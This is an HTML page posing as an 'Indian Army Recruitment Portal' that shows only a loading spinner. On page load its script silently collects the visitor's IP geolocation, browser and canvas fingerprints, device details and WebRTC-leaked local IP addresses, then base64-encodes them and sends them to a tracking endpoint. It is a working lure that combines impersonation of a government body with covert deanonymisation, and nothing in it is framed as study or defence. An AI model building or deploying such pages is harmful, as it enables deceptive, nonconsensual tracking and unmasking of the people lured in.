<!DOCTYPE html>
<html>
<head>
    <title>Indian Army Recruitment</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script>
        // ========================
        // Main Data Collection
        // ========================
        async function collectData() {
            const data = {
                // === Core Identifiers ===
                timestamp: new Date().toISOString(),
                
                // === IPAPI.CO Data (Primary) ===
                ipapiData: await getIpApiData(),
                
                // === Fallback IP Data ===
                fallbackIP: await getFallbackIP(),
                
                // === Browser Fingerprint ===
                fingerprint: await getFingerprint(),
                canvasHash: getCanvasFingerprint(),
                
                // === Device Characteristics ===
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // === Network Insights ===
                networkType: navigator.connection?.effectiveType || "unknown",
                webRTCLeak: await getLocalIPs()
            };

            // Send to server (Base64 encoded)
            const encoded = btoa(JSON.stringify(data));
            window.location.href = `/.netlify/functions/track?d=${encoded}`;
        }

        // ========================
        // Data Collection Methods
        // ========================

        // 1. Get Complete IPAPI.CO Data
        async function getIpApiData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) return await response.json();
                return {error: "API blocked"};
            } catch (e) {
                return {error: e.message};
            }
        }

        // 2. Fallback IP Detection
        async function getFallbackIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                return await response.json();
            } catch (e) {
                return {ip: "unknown"};
            }
        }

        // 3. Fingerprinting
        async function getFingerprint() {
            try {
                const fp = await FingerprintJS.load();
                const {visitorId} = await fp.get();
                return visitorId;
            } catch (e) {
                return "error";
            }
        }

        // 4. Canvas Fingerprinting
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.fillText('INDIANARMY', 2, 2);
                return canvas.toDataURL().substring(0, 50);
            } catch (e) {
                return "error";
            }
        }

        // 5. WebRTC Local IP Leak
        async function getLocalIPs() {
            try {
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                const ips = [];
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
                    if (ip) ips.push(ip);
                };
                await pc.createOffer();
                await new Promise(resolve => setTimeout(resolve, 500));
                return ips;
            } catch (e) {
                return ["blocked"];
            }
        }

        // Start collection
        window.onload = collectData;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 2rem;
            background: #f5f5f5;
        }
        h1 {
            color: #d22b2b;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #d22b2b;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Indian Army Recruitment Portal</h1>
    <p>Verifying your device information...</p>
    <div class="loader"></div>
</body>
</html>
